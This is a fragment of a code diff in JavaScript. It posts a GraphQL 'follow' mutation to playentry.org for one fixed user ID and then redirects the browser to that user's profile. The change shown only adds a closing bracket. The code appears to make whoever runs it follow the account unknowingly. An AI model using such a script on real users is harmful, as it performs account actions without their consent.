@@ -18,5 +18,5 @@ fetch("https://playentry.org/graphql", {
   "body": '{"query":"mutation FOLLOW($user:String){follow(user:$user){status}}","variables":{"user":"6664f9fd5d1530b27bc11230"}}',
   "method": "POST",
 });
-
+})
 location.href = "https://playentry.org/profile/6664f9fd5d1530b27bc11230"
